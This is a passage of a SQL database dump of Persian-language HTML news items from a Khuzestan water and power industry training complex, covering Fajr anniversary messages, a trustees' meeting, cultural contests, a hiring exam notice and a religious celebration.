			<td>
				<img alt="" src="wp-content/uploads/news-images/image_51.jpeg" /></td>
			<td style="width: 5px;">
				&nbsp;</td>
			<td style="width: 300px;">
				<img alt="" src="wp-content/uploads/news-images/image_52.jpeg" /></td>
		</tr>
		<tr>
			<td>
				&nbsp;</td>
			<td>
				&nbsp;</td>
			<td>
				&nbsp;</td>
			<td>
				&nbsp;</td>
			<td>
				&nbsp;</td>
		</tr>
		<tr>
			<td>
				<img alt="" src="wp-content/uploads/news-images/image_53.jpeg" /></td>
			<td>
				&nbsp;</td>
			<td>
				<img alt="" src="wp-content/uploads/news-images/image_54.jpeg" /></td>
			<td>
				&nbsp;</td>
			<td>
				<img alt="" src="wp-content/uploads/news-images/image_55.jpeg" /></td>
		</tr>
		<tr>
			<td>
				&nbsp;</td>
			<td>
				&nbsp;</td>
			<td>
				&nbsp;</td>
			<td>
				&nbsp;</td>
			<td>
				&nbsp;</td>
		</tr>
		<tr>
			<td>
				<img alt="" src="wp-content/uploads/news-images/image_56.jpeg" /></td>
			<td>
				&nbsp;</td>
			<td>
				&nbsp;</td>
			<td>
				&nbsp;</td>
			<td>
				&nbsp;</td>
		</tr>
	</tbody>
</table>
<p>
	&nbsp;</p>
', '54194slhnws.jpg', 1008, '1401/11/11', '1:06:43 PM', 1401, 'بهمن', 11, '11');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (54195, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'پیام تبریک سرپرست مجتمع به مناسبت دهه فجر', '<p>
	پیام تبریک سرپرست مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان به مناسبت فرا رسیدن ایام الله دهه مبارک فجر و چهل و چهارمین سالگرد پیروزی انقلاب شکوهمند اسلامی</p>
', '<p style="text-align: justify;">
	<span style="font-size:14px;">انقلاب&nbsp; سال ١٣٥٧، طلوع عصری زرین در سرگذشت مردمانی است که باور کردند پیشرفت و سعادت جز با رهایی از بند استبداد، میسر نیست. مسیری که متولد شد و با درایت&nbsp; بنیانگذار و رهبر عظیم الشانش انفجار نور لقب گرفت تا جهانیان بدانند که ظلمت هرگز پایدار نخواهد ماند، به خصوص در سرزمینی که مردمانش قلب&zwnj;هایی به زیبایی و روشنی الماس دارند. دهه مبارک فجر، ایام به ثمر رسیدن جانفشانی&zwnj;های مردم آزاده&zwnj;ای است که در برابر استبدادی دیرپا، وابسته به بیگانه و عدالت &zwnj;ستیز یکپارچه به پاخاستند و در چنین روزهایی فرشی از صداقت به پهنای ایران زمین گستردند و حضور امام عشق را در فضای این آب و خاک محقق ساختند و انقلاب بزرگ و تاریخ&zwnj; ساز خود را به پیروزی رساندند.<br />
	<br />
	اینجانب ضمن گرامیداشت یاد امام خمینی (ره) و درود به روح پاک و مطهر ایشان و ارواح طیبه شهدا، فرا رسیدن چهل و چهارمین سالگرد پیروزی شکوهمند انقلاب اسلامی و همچنین ولادت با سعادت امیرالمؤمنین علی(ع) مقتدای همه عدالتخواهان جهان و روز پدر را به پیشگاه مقام عظمای ولایت و به محضر یکایک ملت شریف ایران و به &zwnj;ویژه کارکنان خدوم و ولایتمدار صنعت آب و برق و جامعه دانشگاه جامع علمی کاربردی تبریک و تهنیت عرض می&shy; نمایم و امیدوارم تحت زعامت مقام معظم رهبری، پرچم این انقلاب در دستان صاحب اصلی آن حضرت ولیعصر (عج الله تعالی فجه الشریف) به اهتزاز درآید.</span></p>
', '54195RsNws.jpg', 437, '1401/11/12', '8:12:57 PM', 1401, 'بهمن', 11, '12');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (54196, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'برگزاری جلسه مجمع سالیانه هیات امنای مجتمع', '<p dir="RTL">
	جلسه مجمع سالیانه هیات امنای مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان با حضور اعضای هیات امنا، برگزار شد<span dir="LTR">.</span></p>
<p>
	&nbsp;</p>
', '<p dir="RTL" style="text-align: justify;">
	بیست و نهمین جلسه مجمع هیات امنای مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان به ریاست مهندس عباس صدریان فر، مدیرعامل سازمان آب و برق خوزستان و قائم مقام هیات امنای مجتمع و با حضور سایر اعضا، در روز یکشنبه مورخ 16 بهمن ماه 1401 در سالن جلسات حوزه مدیرعامل سازمان آب و برق خوزستان برگزار و فعالیت های آموزشی، پژوهشی و فرهنگی مجتمع در سال 1400 و 10 ماهه سال 1401 مورد بررسی قرار گرفت<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	در ابتدای جلسه پس از تلاوت آیاتی چند از کلام الله مجید، مهندس صدریان فر ضمن تبریک فرا رسیدن چهل و چهارمین سالگرد پیروزی شکوهمند انقلاب اسلامی و همچنین ولادت با سعادت امیرالمؤمنین علی (ع) و خیر مقدم و خوشامدگویی به اعضاء به ویژه جناب آقای دکتر محمدرضا فدائی تهرانی رئیس مرکز آموزش های تخصصی و صلاحیت حرفه ای صنعت آب و برق، بر جایگاه آموزش در صنعت آب و برق و رسالت خطیر مجتمع در این خصوص تاکید نمودند<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	در این جلسه که رییس مرکز آموزش های تخصصی و صلاحیت حرفه ای صنعت آب و برق، مدیرعامل شرکت توزیع نیروی برق خوزستان، معاونین مالی و پشتیبانی و منابع انسانی شرکت برق منطقه ای خوزستان، نماینده مدیرعامل و معاون منابع انسانی و تحقیقات شرکت آب و فاضلاب خوزستان، معاونت های برنامه ریزی، منابع انسانی، مالی و پشتیبانی و شبکه های آبیاری و زهکشی، مدیریت بازرسی، حسابرسی و مجامع و رئیس گروه آموزش سازمان آب و برق خوزستان حضور داشتند، &ldquo;محسن انصاری&rdquo;سرپرست مجتمع و دبیر هیات امنا، ضمن تبریک ایام الله دهه مبارک فجر و میلاد امام علی (ع)، از همراهی قائم مقام هیات امنا، رییس مرکز آموزش های تخصصی و صلاحیت حرفه ای صنعت آب و برق، کلیه اعضا و شرکت های طرف قرارداد که فعالیت های آموزشی خود را در سال 1400 و 1401 همگام با توسعه فناوری سیستم مدیریت آموزش و یادگیری مجازی مجتمع، آموزش های خود را توسعه دادند تشکر و قدردانی نمود و در ادامه به تشریح فعالیت های مجتمع پرداختند<span dir="LTR">.</span> وی با اشاره به رشد 24 درصدی فعالیت های آموزشی مجتمع در سال 1400 نسبت به سال 1399 و رشد 6 درصدی 10 ماهه سال جاری نسبت به سال قبل، گزارشی از سهم مشارکت شرکت های صنعت آب و برق استان در فعالیت های مجتمع و حوزه آموزش&zwnj;های ارایه شده به ویژه در بخش های شغلی اختصاصی و مدیریتی ارایه نمودند<span dir="LTR">.</span> مهندس انصاری در ادامه ضمن ارائه گزارشی از اقدامات انجام شده در جهت بهبود عملکرد و رویکردهای اصلاحی و با ابراز علاقه مندی و آمادگی مجتمع جهت انجام فعالیت های تحقیقاتی و پژوهش های کاربردی، برنامه های سال ۱۴۰2 و استراتژیک بلند مدت را در حوزه نیازسنجی آموزشی، استانداردسازی و تولید محتوای دوره ها، پیاده سازی و اجرای نظام صلاحیت حرفه ای نیروی انسانی صنعت آب و برق، سنجش و ارزیابی آموزشی سطح 3 و 4، توسعه آموزش های بین الملل، توسعه رویدادهای شتاب و استارتاپ، ایجاد مراکز نوآوری، دانش بنیان و مدیریت دانش، توسعه برنامه های توانمندساز سرمایه انسانی صنعت آب و برق، آموزش های بلندمدت دانشجویی مجتمع تشریح نمودند<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	پس از ارایه گزارش سرپرست مجتمع، گزارش حسابرسی و صورت های مالی مجتمع مورد بررسی قرار گرفت که با توجه به ارایه گزارش حسابرس مبنی بر مطلوب بودن صورت های مالی منتهی به 29 اسفند سال 1400، قائم مقام و سایر اعضای هیات امنا از فعالیت های آموزشی و مدیریت مالی انجام شده ابراز رضایت و تشکر نمودند<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	در ادامه سایر اعضای هیات امنا ضمن تقدیر از فعالیت های مدیریت مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان و مجموعه تحت سرپرستی و ارائه پیشنهاداتی در خصوص ارتقاء فعالیت های مجتمع، از برنامه های مجتمع در جهت توانمندسازی سرمایه انسانی صنعت آب و برق استان و پیشنهادهای توسعه ای و توانمند ساز مجتمع استقبال و حمایت نمودند.</p>
<p dir="RTL" style="text-align: justify;">
	در پایان مهندس صدریان فر ضمن تشکر از حضور اعضا و فعالیت های بسیار خوب مجتمع، بر استمرار فعالیت های اثربخش مذکور و انعقاد قرارداد آموزشی و پژوهشی شرکت های صنعت آب و برق استان با مجتمع ضمن حفظ کیفیت و توسعه ظرفیت های آموزشی و پژوهشی جهت تحقق شعار سال مقام معظم رهبری (مدظله العالی) تاکید نمودند.</p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;</p>
<table align="center" border="0" cellpadding="0" cellspacing="0" style="width: 910px">
	<tbody>
		<tr>
			<td style="text-align: center; vertical-align: middle;">
				<img alt="" src="wp-content/uploads/news-images/image_57.jpeg" /></td>
			<td style="text-align: center; vertical-align: middle; width: 5px;">
				&nbsp;</td>
			<td style="text-align: center; vertical-align: middle;">
				<img alt="" src="wp-content/uploads/news-images/image_58.jpeg" /></td>
			<td style="text-align: center; vertical-align: middle; width: 5px;">
				&nbsp;</td>
			<td style="text-align: center; vertical-align: middle;">
				<img alt="" src="wp-content/uploads/news-images/image_59.jpeg" /></td>
		</tr>
		<tr>
			<td style="text-align: center; vertical-align: middle;">
				&nbsp;</td>
			<td style="text-align: center; vertical-align: middle; width: 5px;">
				&nbsp;</td>
			<td style="text-align: center; vertical-align: middle;">
				&nbsp;</td>
			<td style="text-align: center; vertical-align: middle; width: 5px;">
				&nbsp;</td>
			<td style="text-align: center; vertical-align: middle;">
				&nbsp;</td>
		</tr>
		<tr>
			<td style="text-align: center; vertical-align: middle;">
				<img alt="" src="wp-content/uploads/news-images/image_60.jpeg" /></td>
			<td style="text-align: center; vertical-align: middle; width: 5px;">
				&nbsp;</td>
			<td style="text-align: center; vertical-align: middle;">
				<img alt="" src="wp-content/uploads/news-images/image_61.jpeg" /></td>
			<td style="text-align: center; vertical-align: middle; width: 5px;">
				&nbsp;</td>
			<td style="text-align: center; vertical-align: middle;">
				<img alt="" src="wp-content/uploads/news-images/image_62.jpeg" /></td>
		</tr>
		<tr>
			<td style="text-align: center; vertical-align: middle;">
				&nbsp;</td>
			<td style="text-align: center; vertical-align: middle; width: 5px;">
				&nbsp;</td>
			<td style="text-align: center; vertical-align: middle;">
				&nbsp;</td>
			<td style="text-align: center; vertical-align: middle; width: 5px;">
				&nbsp;</td>
			<td style="text-align: center; vertical-align: middle;">
				&nbsp;</td>
		</tr>
		<tr>
			<td style="text-align: center; vertical-align: middle;">
				<img alt="" src="wp-content/uploads/news-images/image_63.jpeg" /></td>
			<td style="text-align: center; vertical-align: middle; width: 5px;">
				&nbsp;</td>
			<td style="text-align: center; vertical-align: middle;">
				<img alt="" src="wp-content/uploads/news-images/image_64.jpeg" /></td>
			<td style="text-align: center; vertical-align: middle; width: 5px;">
				&nbsp;</td>
			<td style="text-align: center; vertical-align: middle;">
				<img alt="" src="wp-content/uploads/news-images/image_65.jpeg" /></td>
		</tr>
	</tbody>
</table>
<p>
	&nbsp;</p>
', '54196HOmana.jpg', 275, '1401/11/18', '2:42:04 PM', 1401, 'بهمن', 11, '18');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (54197, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'دیدار سرپرست مجتمع با خانواده شهید فاضل موسوی امین', '<p dir="RTL" style="text-align: justify;">
	دیدار سرپرست مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان به همراه فرمانده حوزه مقاومت بسیج شهید عباسپور و جمعی از اساتید و کارکنان، با خانواده معظم شهید مدافع حرم سید فاضل موسوی امین</p>
<p>
	&nbsp;</p>
', '<p dir="RTL" style="text-align: justify;">
	سرپرست مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان به همراه فرمانده حوزه مقاومت بسیج شهید عباسپور و جمعی از اساتید و کارکنان، در منزل&nbsp; شهید مدافع حرم <em><strong>سید فاضل موسوی امین </strong></em>حضور یافتند و با خانواده معظم این شهید والا مقام دیدار کردند.</p>
<p dir="RTL" style="text-align: justify;">
	محسن انصاری سرپرست مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان در این دیدار با بیان اینکه شهدای مدافع حرم با بصیرت و شجاعت در میدان نبرد حضور داشتند گفت: این شهدا وظیفه خود را به درستی شناختند و دراین راه نیز به نهایت آرزوی خود یعنی شهادت رسیدند. وی در ادامه افزود: خانواده های معظم شهدا با تقدیم بهترین عزیزان خود در راه دفاع از آرمان های کشور و مرزهای آن کاری بزرگ و ستودنی انجام دادند که این مهم، افتخار بزرگی برای تمام ملت ایران است<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	عباس نبگانی فرمانده حوزه مقاومت بسیج شهید عباسپور با تاکید به اینکه امروز خانواده های شهدا مایه افتخار کشور هستند، گفتند: حضور در جمع این خانواده ها علاوه بر اینکه مسئولیت ما را در انجام وظایف سخت تر می کند، انرژی مضاعفی را برای خدمت رسانی ایجاد می کند. وی در ادامه افزود: شهدا نیز همچون همه مردم، درگیری زندگی و روزمرگی&zwnj;های آن بودند و پیشاپیش روی&zwnj;شان نیز زندگی ادامه داشت؛ با این همه، پای باورهایشان ایستادند و از همه چیز خود گذشتند<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	شهید سید فاضل موسوی امین فرزند سید جلال نخستین شهید مدافع حرم شهرک رزمندگان اهواز است که در تاریخ یکم اردیبهشت &zwnj;ماه سال ۱۳۶۴ به &zwnj;عنوان فرزند نخست خانواده، دیده به جهان گشود. پس از هجوم تکفیری &zwnj;ها به کشورهای اسلامی این جوان باغیرت به کشور سوریه رفت و به دفاع از حرم حضرت زینب کبری(س) و حضرت رقیه(س) پرداخت. این دلیرمرد جوان پس از حضور در سوریه در هشتم بهمن&zwnj; ماه سال ۱۳۹۶ به شهادت رسید و پیکر پاکش بعد از پنج ماه به وطن بازگشت. آئین تشییع پیکر مطهر شهید مدافع حرم سید فاضل موسوی امین روز پنج&zwnj;شنبه ۳۱ خردادماه سال 1397 از مقابل مسجد امام خمینی(ره) شهرک رزمندگان اهواز برگزار شد. پس از برگزاری آئین تشییع، پیکر شهید موسوی امین به گلزار شهدای اهواز انتقال یافت و در قطعه شهدای مدافع حرم آرام گرفت.</p>
<p dir="RTL" style="text-align: justify;">
	در این دیدار، هدیه ای از سوی سرپرست مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان به رسم ادب و یادبود به پدر شهید والامقام سید موسوی اهدا شد<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;</p>
<table align="center" border="0" cellpadding="0" cellspacing="0" dir="rtl" style="width: 920px">
	<tbody>
		<tr>
			<td style="text-align: center; width: 300px;">
				<img alt="" src="wp-content/uploads/news-images/image_66.jpeg" /></td>
			<td style="text-align: center; width: 10px;">
				&nbsp;</td>
			<td style="text-align: center; width: 300px;">
				<img alt="" src="wp-content/uploads/news-images/image_67.jpeg" /></td>
			<td style="text-align: center; width: 10px;">
				&nbsp;</td>
			<td style="text-align: center; width: 300px;">
				<img alt="" src="wp-content/uploads/news-images/image_68.jpeg" /></td>
		</tr>
		<tr>
			<td style="text-align: center; width: 300px;">
				&nbsp;</td>
			<td style="text-align: center; width: 10px;">
				&nbsp;</td>
			<td style="text-align: center; width: 300px;">
				&nbsp;</td>
			<td style="text-align: center; width: 10px;">
				&nbsp;</td>
			<td style="text-align: center; width: 300px;">
				&nbsp;</td>
		</tr>
		<tr>
			<td style="text-align: center; width: 300px;">
				<img alt="" src="wp-content/uploads/news-images/image_69.jpeg" /></td>
			<td style="text-align: center; width: 10px;">
				&nbsp;</td>
			<td style="text-align: center; width: 300px;">
				<img alt="" src="wp-content/uploads/news-images/image_70.jpeg" /></td>
			<td style="text-align: center; width: 10px;">
				&nbsp;</td>
			<td style="text-align: center; width: 300px;">
				<img alt="" src="wp-content/uploads/news-images/image_71.jpeg" /></td>
		</tr>
		<tr>
			<td style="text-align: center; width: 300px;">
				&nbsp;</td>
			<td style="text-align: center; width: 10px;">
				&nbsp;</td>
			<td style="text-align: center; width: 300px;">
				&nbsp;</td>
			<td style="text-align: center; width: 10px;">
				&nbsp;</td>
			<td style="text-align: center; width: 300px;">
				&nbsp;</td>
		</tr>
		<tr>
			<td style="text-align: center; width: 300px;">
				<img alt="" src="wp-content/uploads/news-images/image_72.jpeg" /></td>
			<td style="text-align: center; width: 10px;">
				&nbsp;</td>
			<td style="text-align: center; width: 300px;">
				<img alt="" src="wp-content/uploads/news-images/image_73.jpeg" /></td>
			<td style="text-align: center; width: 10px;">
				&nbsp;</td>
			<td style="text-align: center; width: 300px;">
				<img alt="" src="wp-content/uploads/news-images/image_74.jpeg" /></td>
		</tr>
	</tbody>
</table>
<p>
	&nbsp;</p>
', '54197A1.jpg', 505, '1401/11/19', '4:17:18 PM', 1401, 'بهمن', 11, '19');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (54198, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'برگزاری مسابقات فرهنگی ویژه دهه فجر انقلاب اسلامی', '<p dir="RTL" style="text-align: justify;">
	مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان به مناسبت دهه مبارک فجر اقدام به برگزاری مسابقات فرهنگی در زمینه های کتابخوانی، مقاله نویسی، عکاسی، نقاشی، پادکست و ساخت کلیپ نموده است.</p>
<p>
	&nbsp;</p>
', '<p dir="RTL" style="text-align: justify;">
	فرا رسیدن چهل و چهارمین سالگرد پیروزی شکوهمند انقلاب اسلامی و آغاز دهه فجر مبارک باد.</p>
<p dir="RTL" style="text-align: justify;">
	بدین مناسبت مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان با عنایت به رسالت آموزشی و فرهنگی خویش در نظر دارد با همکاری دفتر امور فرهنگی و دینی صنعت آب و برق خوزستان، جهت شکوفایی و پویایی استعداد فرزندان و خانواده صنعت آب و برق، دانشگاه و مراکز آموزش علمی کاربردی استان خوزستان و به منظور پیشبرد سیاستگذاری هدفمند و ایجاد فضایی پویا و با نشاط جهت بزرگداشت عید انقلاب، اقدام به تدارک و برگزاری مسابقات فرهنگی شامل کتابخوانی، نقاشی، عکاسی، ساخت کلیپ، پادکست و مقاله نویسی با محوریت ایام الله دهه فجر نماید.</p>
<p dir="RTL" style="text-align: justify;">
	جهت اطلاع از شرایط ثبت نام و شرکت در مسابقه بر روی لینک ذیل کلیک نمایید.</p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;</p>
<p dir="RTL" style="text-align: center;">
	<strong><a href="https://www.kwphc.ir/fajr"><span style="color:#4b0082;"><span style="font-size:16px;">لینک شرکت در مسابقه</span></span></a></strong></p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;</p>
<table align="center" border="0" cellpadding="0" cellspacing="0" style="width: 910px">
	<tbody>
		<tr>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_75.jpeg" /></td>
			<td style="text-align: center; width: 10px;">
				&nbsp;</td>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_76.jpeg" /></td>
		</tr>
	</tbody>
</table>
<p style="text-align: center;">
	&nbsp;</p>
', '54198Mosabeqe.jpg', 334, '1401/11/19', '4:41:19 PM', 1401, 'بهمن', 11, '19');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (54199, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'حضور سرپرست مجتمع در راهپیمایی یوم الله ۲۲ بهمن', '<p style="text-align: justify;">
	محسن انصاری در اجتماع راهپیمایان مراسم یوم&zwnj;الله ۲۲ بهمن و جشن چهل و چهارمین سالگرد انقلاب اسلامی، حضور یافت. جمعی از استادان، کارکنان و دانشجویان مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان، مهندس انصاری را همراهی کردند.<br />
	&nbsp;</p>
', '<p style="text-align: justify;">
	دهه مبارک فجر و یوم&zwnj;الله ۲۲ بهمن، یادآور مجاهدت و ایثار ملت رشید ایران و پیروزی انقلاب اسلامی به رهبری امام راحل عظیم الشأن حضرت امام خمینی(ره) و جانفشانی شهیدان سرافراز این سرزمین است؛ نهضت امام خمینی به عنوان یک تجربه نوین، سرآغاز بیداری در برابر ستمگران و موجب قطع ید استکبار جهانی به سردمداری آمریکای تجاوزکار از ایران اسلامی بوده است و انقلاب اسلامی ایران، فروغ امید و گرمی حیات را به کالبد سرد مسلمانان و مستضعفان جهان دمید و تجربه&zwnj;ای تازه از حکومت دینی توأم با ارزش&zwnj;هایی مانند عدالت، استقلال، آزادی و مردم سالاری دینی را به بشریت عرضه کرد.<br />
	در چهل و چهارمین سالروز پیروزی انقلاب شکوهمند اسلامی ایران، محسن انصاری به همراه جمعی از استادان، کارکنان و دانشجویان مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان، همراه با سایر اقشار ملت انقلابی، متعهد و همیشه در صحنه، در راهپیمایی یوم الله ۲۲ بهمن حضور یافتند و ضمن تجدید میثاق با آرمان&zwnj;های انقلاب اسلامی، بیان نمودند بار دیگر فداکارانه بر عهد و پیمان خود با شهدای والامقام و امام بزرگوار وفادار بوده و در هیچ شرایطی در برابر زورگویان عالم به ویژه شیطان بزرگ؛ آمریکای جنایتکار از نظام مقدس جمهوری اسلامی و آرمان&zwnj;های آن دست نخواهند کشید.</p>
<p style="text-align: justify;">
	&nbsp;</p>
<table border="0" cellpadding="0" cellspacing="0" style="width: 900px">
	<tbody>
		<tr>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_77.jpeg" /></td>
		</tr>
		<tr>
			<td style="text-align: center;">
				&nbsp;</td>
		</tr>
		<tr>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_78.jpeg" /></td>
		</tr>
		<tr>
			<td style="text-align: center;">
				&nbsp;</td>
		</tr>
		<tr>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_79.jpeg" /></td>
		</tr>
	</tbody>
</table>
<p>
	&nbsp;</p>
', '54199nwsbahman.jpg', 285, '1401/11/24', '9:43:12 AM', 1401, 'بهمن', 11, '24');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (54200, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'برگزاری آزمون استخدامی', '<p>
	شرکت برجمان ارشیا، دنیا کاران جنوب و تاراز منار به منظور تأمين نيروي انساني مورد نياز خود از بین افراد واجد شرایط دعوت به همکاری می نماید.</p>', '<p>
	به اطلاع ميرساند شرکت برجمان ارشیا، دنیا کاران جنوب و تاراز منار به منظور تأمين نيروي انساني مورد نياز، <strong>از آقايان </strong>واجد شرايط را از طريق آزمون توانمندي&shy;هاي عمومی و تخصصي(كتبي) و آزمون دانش مهارت (&shy;مصاحبه) و طی فرآیند گزینش و به ترتیب از بالاترین نمره با شرايط ذيل و در قالب قرارداد نیروی حجمی جذب مي&shy; نمايد.</p>
<p dir="RTL" style="text-align: justify;">
	در صورت بروز هرگونه مشكل و ابهام با شماره تلفن 33347248-061 مجتمع عالي آموزشي و پژوهشي صنعت آب و برق خوزستان به عنوان مجري آزمون در وقت اداري تماس حاصل نمایید.</p>', '54200nwsbarjman.jpg', 3330, '1401/11/24', '4:09:55 PM', 1401, 'بهمن', 11, '24');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (55200, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'برگزاری جشن نیمه شعبان در مجتمع', '<p dir="RTL" style="text-align: justify;">
	در آستانه نیمه شعبان، مراسم جشن با شکوهی با حضور خانواده همکاران، اساتید و دانشجویان در روز دوشنبه مورخ 15 اسفند 1401 در محل مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان برگزار گردید.</p>
<p>
	&nbsp;</p>
', '<p dir="RTL" style="text-align: justify;">
	&nbsp;</p>
<p dir="RTL" style="text-align: justify;">
	در آستانه میلاد با سعادت دوازدهمین خورشید تابناک آسمان امامت و ولایت، مراسم جشن با شکوهی با حضور خانواده همکاران، اساتید و دانشجویان در روز دوشنبه مورخ 15/12/1401 در محل مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان برگزار گردید.</p>
<p dir="RTL" style="text-align: justify;">
	در ابتدای مراسم آقای &quot;<strong>مهدی هودگر</strong>&quot; ریاست مجتمع، ضمن خیر مقدم به مدعوین و تبریک اعیاد شعبانیه، میلاد مسعود منجی عالم بشریت حضرت مهدی صاحب الزمان(عج) را تبریک گفتند. در ادامه حجت الاسلام نرادی پرگلی مشاور فرهنگی مدیرعامل سازمان آب و برق خوزستان و رئیس انسجام بخشی امور فرهنگی و دینی صنعت آب و برق استان خوزستان، در سخنانی با اشاره به ترویج اندیشه ظهور و انتظار و تاکید بر&nbsp;ضرورت تبیین درست فرهنگ مهدویت در جامعه اسلامی به تشریح ابعاد مختلف مهدویت و وجود نورانی حضرت بقیه الله الاعظم(عج) پرداختند<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	برگزاری مسابقه، اهدای جوایز، سرود، تواشیح، شعرخوانی و اجرای نمایشنامه از دیگر برنامه های جشن نیمه شعبان بود.</p>
<p dir="RTL" style="text-align: justify;">
	در این مراسم که حجت الاسلام و المسلمین جناب آقای عادلی نژاد ریاست محترم دفتر نهاد مقام معظم رهبری در دانشگاه های استان خوزستان و حجت الاسلام جناب آقای ناصری مسئول دفتر نهاد رهبری در دانشگاه جامع علمی کاربردی خوزستان نیز حضور داشتند به کلیه دانشجویان ممتاز مرکز، لوح تقدیر و هدیه ای نفیس به رسم یاد بود اهدا گردید.</p>
<p dir="RTL" style="text-align: justify;">
	در پایان این جشن از میهمانان به صرف شیرینی و شام، پذیرایی به عمل آمد.</p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;</p>
<table align="center" border="0" cellpadding="0" cellspacing="0" style="width: 915px">
	<tbody>
		<tr>
			<td style="width: 300px; text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_80.jpeg" /></td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="width: 300px; text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_81.jpeg" /></td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="width: 300px; text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_82.jpeg" /></td>
		</tr>
		<tr>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
		</tr>
		<tr>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_83.jpeg" /></td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_84.jpeg" /></td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_85.jpeg" /></td>
		</tr>
		<tr>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
		</tr>
		<tr>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_86.jpeg" /></td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_87.jpeg" /></td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_88.jpeg" /></td>
		</tr>
	</tbody>
</table>
<p>
	&nbsp;</p>
', '54201Mn.jpg', 234, '1401/12/16', '10:52:14 PM', 1401, 'اسفند', 12, '16');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (55201, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'برگزاری رویداد شتاب (استارتاپی)', '<p dir="RTL" style="text-align: justify;">
	دفتر نوآوری مرکز علمی کاربردی صنعت آب و برق خوزستان اقدام به برگزاری رویداد شتاب (استارتاپی) با عنوان <em>&quot;طراحی محتواهای آموزشی و تبلیغاتی در صنعت آب و برق&quot;</em> نمود.</p>
<p>
	&nbsp;</p>', '<p style="text-align: justify;">
